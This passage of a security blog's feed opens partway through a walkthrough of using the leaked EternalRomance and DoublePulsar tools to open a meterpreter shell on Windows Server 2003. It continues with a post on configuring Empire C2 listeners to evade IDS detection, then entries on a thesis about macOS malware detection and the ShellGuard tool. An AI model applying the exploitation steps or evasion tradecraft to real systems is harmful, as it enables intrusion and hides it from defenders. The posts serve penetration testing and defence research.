&lt;figcaption class=&quot;caption&quot;&gt;Doublepulsar generates &lt;code&gt;dopu_shellcode.bin&lt;/code&gt;&lt;/figcaption&gt;

&lt;p&gt;Walk through the default options of Eternalromance, let the Smbtouch execute and afterwards provide the &lt;code&gt;dopu_shellcode.bin&lt;/code&gt; shellcode file generated with Doublepulsar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-26-eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Smbtouch via Eternalromance.&lt;/figcaption&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-26-eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Select proper DoPu shellcode file.&lt;/figcaption&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-26-eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Eternalromance succeeded.&lt;/figcaption&gt;

&lt;p&gt;After Eternalromance succeeded, let’s now prepare a payload of use to us, in this case a meterpreter shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-26-eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Use msfvenom to generate a meterpreter stager DLL.&lt;/figcaption&gt;

&lt;p&gt;Now we’ll let Doublepulsar inject this &lt;code&gt;dll&lt;/code&gt;, and initiate a meterpreter session.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-26-eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Doublepulsar injects &lt;code&gt;meterpreter.dll&lt;/code&gt;&lt;/figcaption&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-26-eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/8.jpeg&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Meterpreter session on the Windows Server 2003 SP2.&lt;/figcaption&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-26-eternalromance-eternal-pwnage-of-windows-server-2003-and-xp/shell.gif&quot; alt=&quot;shell&quot; class=&quot;bigger-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Seriously though, if your organisation relies on these legacy operating systems:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Disable SMBv1, or;&lt;/li&gt;
  &lt;li&gt;Segment the box&lt;/li&gt;
  &lt;li&gt;Run IDS/IPS with signatures for the maliciously crafted SMBv1 packet.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Stay safe!&lt;/p&gt;</content><author><name>vivami</name></author><category term="blog" /><category term="Exploitation" /><category term="MS17-010" /><summary type="html">Most of the write-ups on the leaked Equation Group tools by the shadow brokers are about the Eternalblue exploit, an RCE SMB exploit that provides SYSTEM to the attacker of Windows 7 and Windows Server 2008 machines not patched with MS17–010. Cool stuff, however, maybe even cooler is the stuff that will provide reverse shells for life: Eternalromance on fully patched Windows XP and Server 2003 machines. In this short write-up, I’ll explain how to get EternalRomance working by popping a meterpreter session on a fully patched Windows Server 2003 R2 SP2 box.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://vanmieghem.io/assets/images/markdown.jpg" /></entry><entry><title type="html">Reigning the Empire, evading detection</title><link href="https://vanmieghem.io/reigning-the-empire-evading-detection/" rel="alternate" type="text/html" title="Reigning the Empire, evading detection" /><published>2017-04-02T00:00:00+02:00</published><updated>2017-04-02T00:00:00+02:00</updated><id>https://vanmieghem.io/reigning-the-empire-evading-detection</id><content type="html" xml:base="https://vanmieghem.io/reigning-the-empire-evading-detection/">&lt;p&gt;&lt;strong&gt;tl;dr:&lt;/strong&gt; &lt;em&gt;Configure a (valid) certificate and add jitter to have Empire communications stay below the radar.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Empire, an open-source post exploitation framework by now well-known among pentesters and red teamers. &lt;a href=&quot;https://twitter.com/harmj0y&quot;&gt;@harmj0y&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/sixdub&quot;&gt;@sixdub&lt;/a&gt;, and &lt;a href=&quot;https://twitter.com/enigma0x3&quot;&gt;@enigma0x3&lt;/a&gt; did a terrific job making Empire OpSec safe using various obfuscation techniques. On the endpoints, the most prominent and effective one is having most of the PowerShell modules ran in memory. On the network, it appears to be HTTP traffic where its communications are AES encrypted (more &lt;a href=&quot;https://www.powershellempire.com/?page_id=147&quot;&gt;here&lt;/a&gt;). Empire has been very effective for me, evading pretty much all of the detection mechanisms I had to pass. But recently, it got picked up on the wire by the custom IDS rules of a SOC service provider. As it turned out, I was being a bit sloppy, because Empire can be easily setup to evade these (rather lousy) IDS rules. This is a quick post on what is detected and how to set up Empire to bypass detection.&lt;/p&gt;

&lt;p&gt;So, let’s start out by firing up a listener with default values at &lt;code&gt;192.168.178.162&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-02-reigning-the-empire-evading-detection/1_listener_setup.png&quot; alt=&quot;Listener_setup_1&quot; class=&quot;bigger-image&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Empire listener with default values.&lt;/figcaption&gt;

&lt;p&gt;Execute the stager on the victim at &lt;code&gt;192.168.178.26&lt;/code&gt; and let’s sniff the traffic between attacker and victim.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-02-reigning-the-empire-evading-detection/2_wireshark_traffic.png&quot; alt=&quot;wireshark_traffic_1&quot; class=&quot;bigger-image&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Packet capture of HTTP traffic going to the Empire C2.&lt;/figcaption&gt;

&lt;p&gt;Instantly popping up is the large amount of HTTP keep-alive beacons the agent sends back to the C2. This in itself was not the issue, however, the fact that it requests the default Empire pages &lt;code&gt;/admin/get.php&lt;/code&gt;, &lt;code&gt;/news.asp&lt;/code&gt;, &lt;code&gt;/login/process.jsp&lt;/code&gt; was. If we look more closely to the C2 response, we also see that a default &lt;em&gt;“It works!”&lt;/em&gt; webpage is returned.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-02-reigning-the-empire-evading-detection/3_wireshark_HTTP_packet.png&quot; alt=&quot;EmpireC2_packet&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Empire C2 response viewed in Wireshark. Default &quot;It works!&quot; page is returned.&lt;/figcaption&gt;

&lt;p&gt;A user constantly refreshing an &lt;em&gt;“It works!”&lt;/em&gt; page doesn’t really looks like the benign behaviour to me… Let’s see if we can obfuscate this a bit.
First thing we can do is customise the listeners’ &lt;code&gt;DefaultProfile&lt;/code&gt; to, in this case, &lt;code&gt;/feed.xml&lt;/code&gt; and &lt;code&gt;index.html&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-02-reigning-the-empire-evading-detection/4_listener_setup2.png&quot; alt=&quot;EmpireC2_listener2&quot; class=&quot;bigger-image&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Empire listener with customised DefaultProfile parameter.&lt;/figcaption&gt;

&lt;p&gt;This change results in an obvious customisation of the HTTP requests. In my scenario, this alone was enough to evade the IDS.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-02-reigning-the-empire-evading-detection/5_beacon.png&quot; alt=&quot;beacon&quot; class=&quot;bigger-image&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Keep-alive beacon using customised profile.&lt;/figcaption&gt;

&lt;p&gt;However, the default webpage &lt;em&gt;“It works!”&lt;/em&gt; is still there, which is lame.&lt;/p&gt;

&lt;p&gt;Now, if we provide the listener with a certificate (you may want to use a valid cert to increase stealthiness) and add random jitter, the communication is wrapped in a TLS layer and Empire specifics are gone!&lt;/p&gt;

&lt;p&gt;Excellent. 👌🏼&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-02-reigning-the-empire-evading-detection/6_listener_setup3.png&quot; alt=&quot;beacon&quot; class=&quot;bigger-image&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;Listener set up to use TLS for its communications.&lt;/figcaption&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2017-04-02-reigning-the-empire-evading-detection/7_wireshark_traffic_2.png&quot; alt=&quot;beacon&quot; class=&quot;bigger-image&quot; /&gt;&lt;/p&gt;
&lt;figcaption class=&quot;caption&quot;&gt;TLS wrapped communications between the agents and C2.&lt;/figcaption&gt;</content><author><name>vivami</name></author><category term="blog" /><category term="Empire" /><category term="Tradecraft" /><category term="Detection" /><summary type="html">tl;dr: Configure a (valid) certificate and add jitter to have Empire communications stay below the radar.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://vanmieghem.io/assets/images/markdown.jpg" /></entry><entry><title type="html">Virus Bulletin paper: Behavioural Detection and Prevention of Malware on OS X</title><link href="https://vanmieghem.io/VB-paper/" rel="alternate" type="text/html" title="Virus Bulletin paper: Behavioural Detection and Prevention of Malware on OS X" /><published>2016-09-16T00:00:00+02:00</published><updated>2016-09-16T00:00:00+02:00</updated><id>https://vanmieghem.io/VB-paper</id><content type="html" xml:base="https://vanmieghem.io/VB-paper/">&lt;p&gt;A paper published by Virus Bulletin on research performed during my Master thesis. Paper is available for download &lt;a href=&quot;https://vanmieghem.io/assets/vb201609-behavioural-detection-and-prevention.pdf&quot;&gt;here&lt;/a&gt;. Original publication is available &lt;a href=&quot;https://www.virusbulletin.com/blog/2016/september/paper-behavioural-detection-and-prevention-malware-os-x/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</content><author><name>vivami</name></author><category term="project" /><category term="Paper" /><category term="Master Thesis" /><summary type="html">A paper published by Virus Bulletin on research performed during my Master thesis. Paper is available for download here. Original publication is available here.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://vanmieghem.io/assets/images/headers/virus-bulletin.jpg" /></entry><entry><title type="html">Shellguard: blocking the execution of shell processes by unknown processes</title><link href="https://vanmieghem.io/shellguard/" rel="alternate" type="text/html" title="Shellguard: blocking the execution of shell processes by unknown processes" /><published>2016-07-06T00:00:00+02:00</published><updated>2016-07-06T00:00:00+02:00</updated><id>https://vanmieghem.io/shellguard</id><content type="html" xml:base="https://vanmieghem.io/shellguard/">&lt;p&gt;Shellguard is a security application implementing the results found during Master thesis research. ShellGuard aims to provide an extra generic layer of security by guarding the execution of a shell process on macOS. &lt;a href=&quot;/VB-paper/&quot;&gt;My research shows&lt;/a&gt; that OS X malware is strongly dependent on a shell process to harm the system. ShellGuard prevents the execution of shells by unknown processes.&lt;/p&gt;

&lt;p&gt;ShellGuard consists of a kernel extension (kext) and a userspace client/daemon that communicate through a &lt;code class=&quot;highlighter-rouge&quot;&gt;PF_SYSTEM&lt;/code&gt; socket. The kext uses OS X’s TrustedBSD framework to hook the execution system calls to become aware of process executions. Based on the policies defined in the &lt;code class=&quot;highlighter-rouge&quot;&gt;SG_config.json&lt;/code&gt; file, ShellGuard allows or denies the execution of shell processes (&lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/python&lt;/code&gt; etc.).&lt;/p&gt;

&lt;p&gt;The ShellGuard daemon/client remains in userspace and runs in privileged mode, which is why I have chosen to write it in Swift, a memory safe language. The daemon parses the ShellGuard policy file (JSON) and passes these rules to the kernel extension.&lt;/p&gt;

&lt;p&gt;ShellGuard is available for download on &lt;a href=&quot;https://github.com/vivami/shellguard&quot;&gt;Github&lt;/a&gt;.&lt;/p&gt;</content><author><name>vivami</name></author><category term="project" /><category term="Github" /><category term="Master Thesis" /><summary type="html">Shellguard is a security application implementing the results found during Master thesis research. ShellGuard aims to provide an extra generic layer of security by guarding the execution of a shell process on macOS. My research shows that OS X malware is strongly dependent on a shell process to harm the system. ShellGuard prevents the execution of shells by unknown processes.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://vanmieghem.io/assets/images/headers/shellguard.png" /></entry><entry><title type="html">Master Thesis: Detecting malicious behaviour using system calls</title><link href="https://vanmieghem.io/master-thesis/" rel="alternate" type="text/html" title="Master Thesis: Detecting malicious behaviour using system calls" /><published>2016-06-14T00:00:00+02:00</published><updated>2016-06-14T00:00:00+02:00</updated><id>https://vanmieghem.io/master-thesis</id><content type="html" xml:base="https://vanmieghem.io/master-thesis/">&lt;p&gt;During my Master thesis I have come up with a method to detect malicious behaviour on Apple’s macOS. My Master thesis is available for download &lt;a href=&quot;https://vanmieghem.io/assets/thesis_vvanmieghem_R3.pdf&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Below is an abstract of my work.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The emergence of Apple’s Macintosh computers’ popularity introduces new threats and challenges for the security on the Mac. For a long time, OS X security has benefitted from the popularity of Microsoft Windows. The threat landscape for the Mac is rapidly changing as the marketshare of the Mac is approaching 15%. Malware on Apple’s OS X systems emerges to be an increasing security threat that is currently solely countered with ancient anti-virus (AV) technologies. Current AV technologies pose a performance overhead on the entire system and have an inherent delayed effectiveness, due to their signature based detection. In addition, current malware uses many forms of obfuscation to prevent detection by AV technologies, redering AV technologies useless against advanced threats. Consequently, the need for more advanced detection and prevention techniques of malware is increasing. Detection of malicious behaviour instead of malicious signatures, ought to provide a more advanced form of protection. A system call is referred to as the request and service of specific, basic, functionality provided to applications by the operating system.&lt;/p&gt;

  &lt;p&gt;This Master thesis answers the research question: &lt;em&gt;“Is it possible to detect malicious behaviour performed by malware, based on monitoring system calls?”&lt;/em&gt;&lt;/p&gt;

  &lt;p&gt;Presented is a novel, generic, behavioural detection and prevention mechanism for malware on OS X based on system calls. System call traces can be used to describe the behaviour of processes. Much effort was put into the development of a kernel module that bypasses kernel security mechanisms and rewires one of the operating system’s core functionalities; system call handling. The rewiring of system call handling provided the ability to log all of the system call invocations performed by processes running on the monitored system. A significant amount of OS X malware and benign applications were executed in a monitored environment of which system call traces were collected. Based on analysing heat map visualisations and manual sequential analysis of the system call traces of both malicious and benign processes, anomalies in the malicious traces could be observed. Subsequently, several mali- cious system call patterns and detection rules were extracted providing detection of malware on OS X. The most successful defined pattern is constructed around the executions of Unix shell processes performed by malware. It is shown that this detection pattern results in a 100% detection rate of all malware possible to obtain for this thesis. Even advanced malware in an infected OS X application, known as OSX.KeyRanger.A, was detected using this method. In order to evaluate the False Positive Rate (FPR) accurately in real world scenarios, three different user profiles were defined. Applications distributed via the Mac App Store do not generate false positives. In case of the developer user profile type, the FPR increases to 20%. Applications responsible for the false positives feature a cross-platform nature, such as MATLAB, R, LaTeX and interpreters for scripting languages. A conducted survey under Mac users verified these conclusions. However, the number of false positive generating benign applications is very limited and whitelisting solutions provided can reduce the FPR in this developer user profile. The results of this Master thesis have been composed in a paper “Behavioural detection and prevention of malware on Mac OS X” (appendix A) and submitted to the IEEE CNS 2016 conference.&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>vivami</name></author><category term="project" /><category term="Master Thesis" /><category term="TU Delft" /><summary type="html">During my Master thesis I have come up with a method to detect malicious behaviour on Apple’s macOS. My Master thesis is available for download here.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://vanmieghem.io/assets/images/headers/TU_fox.png" /></entry><entry><title type="html">Paper: Anonymous online purchases with exhaustive operational security</title><link href="https://vanmieghem.io/anonymous-online-purchases-with-exhaustive-operational-security/" rel="alternate" type="text/html" title="Paper: Anonymous online purchases with exhaustive operational security" /><published>2015-05-27T00:00:00+02:00</published><updated>2015-05-27T00:00:00+02:00</updated><id>https://vanmieghem.io/anonymous-online-purchases-with-exhaustive-operational-security</id><content type="html" xml:base="https://vanmieghem.io/anonymous-online-purchases-with-exhaustive-operational-security/">&lt;p&gt;Paper together with dr. Johan Pouwelse on the possibilities of anonymous purchases on the Internet taking into account the surveillance capabilities leaked the in “Snowden leaks”. Paper is available for download &lt;a href=&quot;https://vanmieghem.io/assets/1505.07370.pdf&quot;&gt;here&lt;/a&gt;. Originally uploaded to &lt;a href=&quot;https://arxiv.org/abs/1505.07370&quot;&gt;arXiv.org&lt;/a&gt;.&lt;/p&gt;</content><author><name>vivami</name></author><category term="project" /><category term="TU Delft" /><summary type="html">Paper together with dr. Johan Pouwelse on the possibilities of anonymous purchases on the Internet taking into account the surveillance capabilities leaked the in “Snowden leaks”. Paper is available for download here. Originally uploaded to arXiv.org.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://vanmieghem.io/assets/images/headers/TUD.png" /></entry></feed>